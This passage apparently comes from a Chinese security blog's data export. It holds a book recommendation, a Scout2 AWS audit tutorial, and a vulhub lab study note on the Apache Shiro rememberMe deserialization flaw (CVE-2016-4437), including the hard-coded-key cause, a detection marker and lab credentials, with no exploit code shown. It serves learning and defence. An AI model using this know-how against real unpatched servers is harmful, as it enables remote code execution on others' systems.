Real-World-Bug-Hunting\ndate: 2020-04-18 08:48:40\ntags:\n - Books\n---\n《Real-World Bug Hunting: A Field Guide to Web Hacking》是一本2019年面向Web安全初学者的安全入门书籍.本书主要分享一些厂商的实际漏洞案例,并给出奖金额度、PoC和报告链接,覆盖了许多常见的Web漏洞类型,比如XSS、SQL注入、XXE等等.\n\n## A Field Guide to Web Hacking\n\n本书主要是面向Web安全初学者,定位是Web安全方向,感兴趣的可以阅读下.\n\n![](/images/real-world-bug-hunting/bug.jpg)\n\n在线阅读:[Real-World-Bug-Hunting](http://www.si1ent.xyz/ziliao/Real-World-Bug-Hunting.pdf)\n\n#### 参考\n\n文档来源微信公众号:[漏洞战争(vulwar)](https://mp.weixin.qq.com/s/o4VCEBrL0jTuIMCoNf_-2w)\n\n感谢大佬推荐书籍,感谢感谢!!\n\n","slug":"Real-World-Bug-Hunting","published":1,"updated":"2020-10-23T03:37:43.207Z","_id":"ckglobhdr000fb1hq3xsmdv86","comments":1,"layout":"post","photos":[],"link":"","content":"<p>《Real-World Bug Hunting: A Field Guide to Web Hacking》是一本2019年面向Web安全初学者的安全入门书籍.本书主要分享一些厂商的实际漏洞案例,并给出奖金额度、PoC和报告链接,覆盖了许多常见的Web漏洞类型,比如XSS、SQL注入、XXE等等.</p>\n<h2 id=\"A-Field-Guide-to-Web-Hacking\"><a href=\"#A-Field-Guide-to-Web-Hacking\" class=\"headerlink\" title=\"A Field Guide to Web Hacking\"></a>A Field Guide to Web Hacking</h2><p>本书主要是面向Web安全初学者,定位是Web安全方向,感兴趣的可以阅读下.</p>\n<p><img src=\"/images/real-world-bug-hunting/bug.jpg\"></p>\n<p>在线阅读:<a href=\"http://www.si1ent.xyz/ziliao/Real-World-Bug-Hunting.pdf\">Real-World-Bug-Hunting</a></p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p>文档来源微信公众号:<a href=\"https://mp.weixin.qq.com/s/o4VCEBrL0jTuIMCoNf_-2w\">漏洞战争(vulwar)</a></p>\n<p>感谢大佬推荐书籍,感谢感谢!!</p>\n","site":{"data":{}},"excerpt":"","more":"<p>《Real-World Bug Hunting: A Field Guide to Web Hacking》是一本2019年面向Web安全初学者的安全入门书籍.本书主要分享一些厂商的实际漏洞案例,并给出奖金额度、PoC和报告链接,覆盖了许多常见的Web漏洞类型,比如XSS、SQL注入、XXE等等.</p>\n<h2 id=\"A-Field-Guide-to-Web-Hacking\"><a href=\"#A-Field-Guide-to-Web-Hacking\" class=\"headerlink\" title=\"A Field Guide to Web Hacking\"></a>A Field Guide to Web Hacking</h2><p>本书主要是面向Web安全初学者,定位是Web安全方向,感兴趣的可以阅读下.</p>\n<p><img src=\"/images/real-world-bug-hunting/bug.jpg\"></p>\n<p>在线阅读:<a href=\"http://www.si1ent.xyz/ziliao/Real-World-Bug-Hunting.pdf\">Real-World-Bug-Hunting</a></p>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><p>文档来源微信公众号:<a href=\"https://mp.weixin.qq.com/s/o4VCEBrL0jTuIMCoNf_-2w\">漏洞战争(vulwar)</a></p>\n<p>感谢大佬推荐书籍,感谢感谢!!</p>\n"},{"title":"Scout2","date":"2020-05-22T18:27:09.000Z","_content":"Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.\n## Scout 2使用\n### 介绍\n1. Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.\n2. 有时候我们不经意间会将我们的某些端口或服务暴露给全世界,这样做的危害是什么呢?\n    1. 暴露的数据:简单地让 S3 桶对世界开放可能对客户造成极大的破坏,因为他们的数据暴露在外并对公司的声誉造成不可挽回的损害.\n    2. 暴露服务:安全组上的开放端口可能会使 MySQL 或 MongoDB 处于打开状态并且数据处于打开状态.\n    3. 帐户泄露:AWS root或 IAM 用户的泄露凭据可能导致帐户完全失去控制权或大额帐单.\n3. Scout2用Python编写的,运行版本为 2.7、3.3到3.6,需要AWS python库boto3.Scout2 根据GPL v2.0获得许可,可免费获得,并且拥有一组活跃的贡献者.目前，Scout2 会收集有关以下关键AWS服务的信息，并在本地生成的HTML报告中显示问题，并使用仪表板深入了解详细信息:\n    1. EC2\n    2. IAM\n    3. RDS\n    4. S3\n    5. CloudTrail\n    6. CloudFormation\n    7. CloudWatch\n    8. Route53\n    9. SES\n    10. SQS\n    11. VPC\n    12. SNS\n    13. Redshift\n    14. Elasticache\n    15. EMR\n\n## Scout2安装\n\n``` bash\n# 项目拉取\ngit clone https://github.com/nccgroup/Scout2\ncd Scout2\n# 环境配置\nsudo pip install -r requirements.txt\n# 安装\npython setup.py install\nScout2 -h（如下图所示）\n```\n![](/images/scout2/image-20200523150151979.png)\n\n## AWS凭证\n\n``` bash\n安装 Scout2 之后,需要确保拥有一些AWS凭证（密钥/令牌）,这些凭据允许对 Scout2 将要检查的 AWS 服务进行只读访问,需要将此访问策略授予将运行 Scout2 的用户或角色.\n```\n### 创建用户\n在创建一个名为admin的用户，并将访问类型勾选为“编程访问”\n如下图所示:\n![](/images/scout2/image-20200523154146997.png)\n\n### 新建组并赋予策略\n![](/images/scout2/image-20200523154332264.png)\n![](/images/scout2/image-20200523154352903.png)\n\n### CVS 文件下载\n点击“下一步”\n![](/images/scout2/image-20200523154645948.png)\n\n## Scout2 运行\n``` bash\nScout2 --csv-credentials credentials.csv\n```\n### 选项\n* profile：使用特定AWS配置文件的凭据\n\n* regions：评估特定区域而不是所有区域的默认区域\n\n* mfa-serial：允许使用需要MFA的凭据\n\n* no-browser：完成运行后跳过打开浏览器\n\n* report-dir：生成Scout2 HTML报告的路径\n\n  例如:\n```bash\nscout2 ––profile credentials.csv ––regions us-west-2 ––no-browser\n仅针对 “us-west-2” 中的资源运行它.完成后,它不会在浏览器中打开报告.\n```\n### 结果\n![](/images/scout2/image-20200523155502048.png)\n![](/images/scout2/image-20200523155544705.png)\n仪表板根据评估状况显示不同的颜色,可以快速查看问题;该报告采用颜色编码.\n* 绿色=good\n\n* 黄色=warning\n\n* 红色=bad\n\n  \n\n  它显示了为服务评估的资源数量,应用的规则以及结果和检查的完成情况.\n  然后针对不同的种类,我们就可以再次点进去去查看具体的情况.\n  Scout2 的输出易于查看和遍历,因为每个页面都使用颜色来突出显示问题,而大多数页面都是可以深入查看的仪表板.\n## 参考\n```bash\nhttps://www.jianshu.com/p/838a7575c85f\nhttps://github.com/nccgroup/Scout2\n```\n","source":"_posts/Scout2.md","raw":"---\ntitle: Scout2\ndate: 2020-05-23 02:27:09\ntags:\n - Scout2\n---\nScout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.\n## Scout 2使用\n### 介绍\n1. Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.\n2. 有时候我们不经意间会将我们的某些端口或服务暴露给全世界,这样做的危害是什么呢?\n    1. 暴露的数据:简单地让 S3 桶对世界开放可能对客户造成极大的破坏,因为他们的数据暴露在外并对公司的声誉造成不可挽回的损害.\n    2. 暴露服务:安全组上的开放端口可能会使 MySQL 或 MongoDB 处于打开状态并且数据处于打开状态.\n    3. 帐户泄露:AWS root或 IAM 用户的泄露凭据可能导致帐户完全失去控制权或大额帐单.\n3. Scout2用Python编写的,运行版本为 2.7、3.3到3.6,需要AWS python库boto3.Scout2 根据GPL v2.0获得许可,可免费获得,并且拥有一组活跃的贡献者.目前，Scout2 会收集有关以下关键AWS服务的信息，并在本地生成的HTML报告中显示问题，并使用仪表板深入了解详细信息:\n    1. EC2\n    2. IAM\n    3. RDS\n    4. S3\n    5. CloudTrail\n    6. CloudFormation\n    7. CloudWatch\n    8. Route53\n    9. SES\n    10. SQS\n    11. VPC\n    12. SNS\n    13. Redshift\n    14. Elasticache\n    15. EMR\n\n## Scout2安装\n\n``` bash\n# 项目拉取\ngit clone https://github.com/nccgroup/Scout2\ncd Scout2\n# 环境配置\nsudo pip install -r requirements.txt\n# 安装\npython setup.py install\nScout2 -h（如下图所示）\n```\n![](/images/scout2/image-20200523150151979.png)\n\n## AWS凭证\n\n``` bash\n安装 Scout2 之后,需要确保拥有一些AWS凭证（密钥/令牌）,这些凭据允许对 Scout2 将要检查的 AWS 服务进行只读访问,需要将此访问策略授予将运行 Scout2 的用户或角色.\n```\n### 创建用户\n在创建一个名为admin的用户，并将访问类型勾选为“编程访问”\n如下图所示:\n![](/images/scout2/image-20200523154146997.png)\n\n### 新建组并赋予策略\n![](/images/scout2/image-20200523154332264.png)\n![](/images/scout2/image-20200523154352903.png)\n\n### CVS 文件下载\n点击“下一步”\n![](/images/scout2/image-20200523154645948.png)\n\n## Scout2 运行\n``` bash\nScout2 --csv-credentials credentials.csv\n```\n### 选项\n* profile：使用特定AWS配置文件的凭据\n\n* regions：评估特定区域而不是所有区域的默认区域\n\n* mfa-serial：允许使用需要MFA的凭据\n\n* no-browser：完成运行后跳过打开浏览器\n\n* report-dir：生成Scout2 HTML报告的路径\n\n  例如:\n```bash\nscout2 ––profile credentials.csv ––regions us-west-2 ––no-browser\n仅针对 “us-west-2” 中的资源运行它.完成后,它不会在浏览器中打开报告.\n```\n### 结果\n![](/images/scout2/image-20200523155502048.png)\n![](/images/scout2/image-20200523155544705.png)\n仪表板根据评估状况显示不同的颜色,可以快速查看问题;该报告采用颜色编码.\n* 绿色=good\n\n* 黄色=warning\n\n* 红色=bad\n\n  \n\n  它显示了为服务评估的资源数量,应用的规则以及结果和检查的完成情况.\n  然后针对不同的种类,我们就可以再次点进去去查看具体的情况.\n  Scout2 的输出易于查看和遍历,因为每个页面都使用颜色来突出显示问题,而大多数页面都是可以深入查看的仪表板.\n## 参考\n```bash\nhttps://www.jianshu.com/p/838a7575c85f\nhttps://github.com/nccgroup/Scout2\n```\n","slug":"Scout2","published":1,"updated":"2020-10-23T03:38:00.434Z","_id":"ckglobhds000gb1hq56i4dazt","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.</p>\n<h2 id=\"Scout-2使用\"><a href=\"#Scout-2使用\" class=\"headerlink\" title=\"Scout 2使用\"></a>Scout 2使用</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><ol>\n<li>Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.</li>\n<li>有时候我们不经意间会将我们的某些端口或服务暴露给全世界,这样做的危害是什么呢?<ol>\n<li>暴露的数据:简单地让 S3 桶对世界开放可能对客户造成极大的破坏,因为他们的数据暴露在外并对公司的声誉造成不可挽回的损害.</li>\n<li>暴露服务:安全组上的开放端口可能会使 MySQL 或 MongoDB 处于打开状态并且数据处于打开状态.</li>\n<li>帐户泄露:AWS root或 IAM 用户的泄露凭据可能导致帐户完全失去控制权或大额帐单.</li>\n</ol>\n</li>\n<li>Scout2用Python编写的,运行版本为 2.7、3.3到3.6,需要AWS python库boto3.Scout2 根据GPL v2.0获得许可,可免费获得,并且拥有一组活跃的贡献者.目前，Scout2 会收集有关以下关键AWS服务的信息，并在本地生成的HTML报告中显示问题，并使用仪表板深入了解详细信息:<ol>\n<li>EC2</li>\n<li>IAM</li>\n<li>RDS</li>\n<li>S3</li>\n<li>CloudTrail</li>\n<li>CloudFormation</li>\n<li>CloudWatch</li>\n<li>Route53</li>\n<li>SES</li>\n<li>SQS</li>\n<li>VPC</li>\n<li>SNS</li>\n<li>Redshift</li>\n<li>Elasticache</li>\n<li>EMR</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Scout2安装\"><a href=\"#Scout2安装\" class=\"headerlink\" title=\"Scout2安装\"></a>Scout2安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 项目拉取</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/nccgroup/Scout2</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Scout2</span><br><span class=\"line\"><span class=\"comment\"># 环境配置</span></span><br><span class=\"line\">sudo pip install -r requirements.txt</span><br><span class=\"line\"><span class=\"comment\"># 安装</span></span><br><span class=\"line\">python setup.py install</span><br><span class=\"line\">Scout2 -h（如下图所示）</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/scout2/image-20200523150151979.png\"></p>\n<h2 id=\"AWS凭证\"><a href=\"#AWS凭证\" class=\"headerlink\" title=\"AWS凭证\"></a>AWS凭证</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">安装 Scout2 之后,需要确保拥有一些AWS凭证（密钥/令牌）,这些凭据允许对 Scout2 将要检查的 AWS 服务进行只读访问,需要将此访问策略授予将运行 Scout2 的用户或角色.</span><br></pre></td></tr></table></figure>\n<h3 id=\"创建用户\"><a href=\"#创建用户\" class=\"headerlink\" title=\"创建用户\"></a>创建用户</h3><p>在创建一个名为admin的用户，并将访问类型勾选为“编程访问”<br>如下图所示:<br><img src=\"/images/scout2/image-20200523154146997.png\"></p>\n<h3 id=\"新建组并赋予策略\"><a href=\"#新建组并赋予策略\" class=\"headerlink\" title=\"新建组并赋予策略\"></a>新建组并赋予策略</h3><p><img src=\"/images/scout2/image-20200523154332264.png\"><br><img src=\"/images/scout2/image-20200523154352903.png\"></p>\n<h3 id=\"CVS-文件下载\"><a href=\"#CVS-文件下载\" class=\"headerlink\" title=\"CVS 文件下载\"></a>CVS 文件下载</h3><p>点击“下一步”<br><img src=\"/images/scout2/image-20200523154645948.png\"></p>\n<h2 id=\"Scout2-运行\"><a href=\"#Scout2-运行\" class=\"headerlink\" title=\"Scout2 运行\"></a>Scout2 运行</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Scout2 --csv-credentials credentials.csv</span><br></pre></td></tr></table></figure>\n<h3 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"选项\"></a>选项</h3><ul>\n<li><p>profile：使用特定AWS配置文件的凭据</p>\n</li>\n<li><p>regions：评估特定区域而不是所有区域的默认区域</p>\n</li>\n<li><p>mfa-serial：允许使用需要MFA的凭据</p>\n</li>\n<li><p>no-browser：完成运行后跳过打开浏览器</p>\n</li>\n<li><p>report-dir：生成Scout2 HTML报告的路径</p>\n<p>例如:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scout2 ––profile credentials.csv ––regions us-west-2 ––no-browser</span><br><span class=\"line\">仅针对 “us-west-2” 中的资源运行它.完成后,它不会在浏览器中打开报告.</span><br></pre></td></tr></table></figure>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p><img src=\"/images/scout2/image-20200523155502048.png\"><br><img src=\"/images/scout2/image-20200523155544705.png\"><br>仪表板根据评估状况显示不同的颜色,可以快速查看问题;该报告采用颜色编码.</p>\n</li>\n<li><p>绿色=good</p>\n</li>\n<li><p>黄色=warning</p>\n</li>\n<li><p>红色=bad</p>\n</li>\n</ul>\n<p>  它显示了为服务评估的资源数量,应用的规则以及结果和检查的完成情况.<br>  然后针对不同的种类,我们就可以再次点进去去查看具体的情况.<br>  Scout2 的输出易于查看和遍历,因为每个页面都使用颜色来突出显示问题,而大多数页面都是可以深入查看的仪表板.</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.jianshu.com/p/838a7575c85f</span><br><span class=\"line\">https://github.com/nccgroup/Scout2</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.</p>\n<h2 id=\"Scout-2使用\"><a href=\"#Scout-2使用\" class=\"headerlink\" title=\"Scout 2使用\"></a>Scout 2使用</h2><h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><ol>\n<li>Scout2 是一款用于 AWS 环境的安全审计工具.有了Scout2,不必人工浏览所有网页,就可以获取到 AWS 环境的配置数据;它甚至还能生成一份攻击面报告.Scout2 带有预配置的规则,并且很容易扩展以支持更多的服务和测试用例.因为 Scout2 仅通过 AWS的API去获取配置信息和发现安全隐患,所以无需提交 AWS 安全漏洞和渗透测试申请表.</li>\n<li>有时候我们不经意间会将我们的某些端口或服务暴露给全世界,这样做的危害是什么呢?<ol>\n<li>暴露的数据:简单地让 S3 桶对世界开放可能对客户造成极大的破坏,因为他们的数据暴露在外并对公司的声誉造成不可挽回的损害.</li>\n<li>暴露服务:安全组上的开放端口可能会使 MySQL 或 MongoDB 处于打开状态并且数据处于打开状态.</li>\n<li>帐户泄露:AWS root或 IAM 用户的泄露凭据可能导致帐户完全失去控制权或大额帐单.</li>\n</ol>\n</li>\n<li>Scout2用Python编写的,运行版本为 2.7、3.3到3.6,需要AWS python库boto3.Scout2 根据GPL v2.0获得许可,可免费获得,并且拥有一组活跃的贡献者.目前，Scout2 会收集有关以下关键AWS服务的信息，并在本地生成的HTML报告中显示问题，并使用仪表板深入了解详细信息:<ol>\n<li>EC2</li>\n<li>IAM</li>\n<li>RDS</li>\n<li>S3</li>\n<li>CloudTrail</li>\n<li>CloudFormation</li>\n<li>CloudWatch</li>\n<li>Route53</li>\n<li>SES</li>\n<li>SQS</li>\n<li>VPC</li>\n<li>SNS</li>\n<li>Redshift</li>\n<li>Elasticache</li>\n<li>EMR</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Scout2安装\"><a href=\"#Scout2安装\" class=\"headerlink\" title=\"Scout2安装\"></a>Scout2安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 项目拉取</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/nccgroup/Scout2</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Scout2</span><br><span class=\"line\"><span class=\"comment\"># 环境配置</span></span><br><span class=\"line\">sudo pip install -r requirements.txt</span><br><span class=\"line\"><span class=\"comment\"># 安装</span></span><br><span class=\"line\">python setup.py install</span><br><span class=\"line\">Scout2 -h（如下图所示）</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/scout2/image-20200523150151979.png\"></p>\n<h2 id=\"AWS凭证\"><a href=\"#AWS凭证\" class=\"headerlink\" title=\"AWS凭证\"></a>AWS凭证</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">安装 Scout2 之后,需要确保拥有一些AWS凭证（密钥/令牌）,这些凭据允许对 Scout2 将要检查的 AWS 服务进行只读访问,需要将此访问策略授予将运行 Scout2 的用户或角色.</span><br></pre></td></tr></table></figure>\n<h3 id=\"创建用户\"><a href=\"#创建用户\" class=\"headerlink\" title=\"创建用户\"></a>创建用户</h3><p>在创建一个名为admin的用户，并将访问类型勾选为“编程访问”<br>如下图所示:<br><img src=\"/images/scout2/image-20200523154146997.png\"></p>\n<h3 id=\"新建组并赋予策略\"><a href=\"#新建组并赋予策略\" class=\"headerlink\" title=\"新建组并赋予策略\"></a>新建组并赋予策略</h3><p><img src=\"/images/scout2/image-20200523154332264.png\"><br><img src=\"/images/scout2/image-20200523154352903.png\"></p>\n<h3 id=\"CVS-文件下载\"><a href=\"#CVS-文件下载\" class=\"headerlink\" title=\"CVS 文件下载\"></a>CVS 文件下载</h3><p>点击“下一步”<br><img src=\"/images/scout2/image-20200523154645948.png\"></p>\n<h2 id=\"Scout2-运行\"><a href=\"#Scout2-运行\" class=\"headerlink\" title=\"Scout2 运行\"></a>Scout2 运行</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Scout2 --csv-credentials credentials.csv</span><br></pre></td></tr></table></figure>\n<h3 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"选项\"></a>选项</h3><ul>\n<li><p>profile：使用特定AWS配置文件的凭据</p>\n</li>\n<li><p>regions：评估特定区域而不是所有区域的默认区域</p>\n</li>\n<li><p>mfa-serial：允许使用需要MFA的凭据</p>\n</li>\n<li><p>no-browser：完成运行后跳过打开浏览器</p>\n</li>\n<li><p>report-dir：生成Scout2 HTML报告的路径</p>\n<p>例如:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scout2 ––profile credentials.csv ––regions us-west-2 ––no-browser</span><br><span class=\"line\">仅针对 “us-west-2” 中的资源运行它.完成后,它不会在浏览器中打开报告.</span><br></pre></td></tr></table></figure>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p><img src=\"/images/scout2/image-20200523155502048.png\"><br><img src=\"/images/scout2/image-20200523155544705.png\"><br>仪表板根据评估状况显示不同的颜色,可以快速查看问题;该报告采用颜色编码.</p>\n</li>\n<li><p>绿色=good</p>\n</li>\n<li><p>黄色=warning</p>\n</li>\n<li><p>红色=bad</p>\n</li>\n</ul>\n<p>  它显示了为服务评估的资源数量,应用的规则以及结果和检查的完成情况.<br>  然后针对不同的种类,我们就可以再次点进去去查看具体的情况.<br>  Scout2 的输出易于查看和遍历,因为每个页面都使用颜色来突出显示问题,而大多数页面都是可以深入查看的仪表板.</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.jianshu.com/p/838a7575c85f</span><br><span class=\"line\">https://github.com/nccgroup/Scout2</span><br></pre></td></tr></table></figure>\n"},{"title":"Shiro漏洞学习","date":"2020-08-28T13:57:31.000Z","_content":"\n### 概述\n\nShiro是一个功能强大且易于使用的Java安全框架，可以执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速且轻松地保护任何应用程序——从最小的移动应用程序到最大的web和企业应用程序。\n\n#### Shiro主要功能\n\n```\n1、Authentication：身份认证\n2、Authorization：权限校验\n3、SessionManager：会话管理，用户从登录到退出是一次会话，所有的信息都保存在会话中。普通的java se环境中也支持这种会话。\n4、cryptography：数据加密，如对用户密码进行加密，避免将密码明文存入数据库中。\n5、Web support：非常容易集成到web环境中。\n6、Caching：缓存，将用户信息和角色权限等缓存起来，不必每次去查\n7、Concurrency：支持多线程，在一个线程中开启新的线程，能把权限传过去。\n8、Testing：提供测试功能\n9、Run As：允许一个用户假装为另一个用户的身份进行访问。\n10、Remember me： 记住用户，一次登录后下次不用登录。\n```\n\n更多需要参考网络\n\n### 环境搭建\n\n拉取docker项目并运行\n\n```shell\ndocker-compose up -d\n```\n\n![image-20200825170834627](/images/Shiro/image-20200825170834627.png)\n\n\n\n### 漏洞实战分类\n\n#### CVE-2016-4437\n\n##### 漏洞描述\n\nApache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。\n\n##### 影响范围\n\nApache Shiro  <=1.2.4\n\n##### 漏洞原理\n\nApache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 > Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。\n\nshiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段\n\n##### 漏洞条件\n\n无\n\n##### 漏洞检测\n\n1、URL访问\n\n```\nhttp://192.168.3.219:8080/doLogin\n```\n\n![image-20200825170958258](/images/Shiro/image-20200825170958258.png)\n\n2、用户登录\n\n```\nadmin／vulhub\n```\n\n![image-20200825171101473](/images/Shiro/image-20200825171101473.png)\n\n\n\n3、PoC获取\n\n运行后如下图所示\n\n![image-20200825171155065](/images/Shiro/image-20200825171155065.png)\n\n##### 漏洞修复\n\n更新至最新版本Shiro\n\n### 参考\n\n```\nhttps://www.cnblogs.com/kyleinjava/p/10542800.html\nhttps://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437\n```","source":"_posts/Shiro漏洞学习.md","raw":"---\ntitle: Shiro漏洞学习\ndate: 2020-08-28 21:57:31\n---\n\n### 概述\n\nShiro是一个功能强大且易于使用的Java安全框架，可以执行身份验证、授权、加密和会话管理。使用Shiro易于理解的API，您可以快速且轻松地保护任何应用程序——从最小的移动应用程序到最大的web和企业应用程序。\n\n#### Shiro主要功能\n\n```\n1、Authentication：身份认证\n2、Authorization：权限校验\n3、SessionManager：会话管理，用户从登录到退出是一次会话，所有的信息都保存在会话中。普通的java se环境中也支持这种会话。\n4、cryptography：数据加密，如对用户密码进行加密，避免将密码明文存入数据库中。\n5、Web support：非常容易集成到web环境中。\n6、Caching：缓存，将用户信息和角色权限等缓存起来，不必每次去查\n7、Concurrency：支持多线程，在一个线程中开启新的线程，能把权限传过去。\n8、Testing：提供测试功能\n9、Run As：允许一个用户假装为另一个用户的身份进行访问。\n10、Remember me： 记住用户，一次登录后下次不用登录。\n```\n\n更多需要参考网络\n\n### 环境搭建\n\n拉取docker项目并运行\n\n```shell\ndocker-compose up -d\n```\n\n![image-20200825170834627](/images/Shiro/image-20200825170834627.png)\n\n\n\n### 漏洞实战分类\n\n#### CVE-2016-4437\n\n##### 漏洞描述\n\nApache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。\n\n##### 影响范围\n\nApache Shiro  <=1.2.4\n\n##### 漏洞原理\n\nApache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 > Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。\n\nshiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段\n\n##### 漏洞条件\n\n无\n\n##### 漏洞检测\n\n1、URL访问\n\n```\nhttp://192.168.3.219:8080/doLogin\n```\n\n![image-20200825170958258](/images/Shiro/image-20200825170958258.png)\n\n2、用户登录\n\n```\nadmin／vulhub\n```\n\n![image-20200825171101473](/images/Shiro/image-20200825171101473.png)\n\n\n\n3、PoC获取\n\n运行后如下图所示\n\n![image-20200825171155065](/images/Shiro/image-20200825171155065.png)\n\n##### 漏洞修复\n\n更新至最新版本Shiro\n\n### 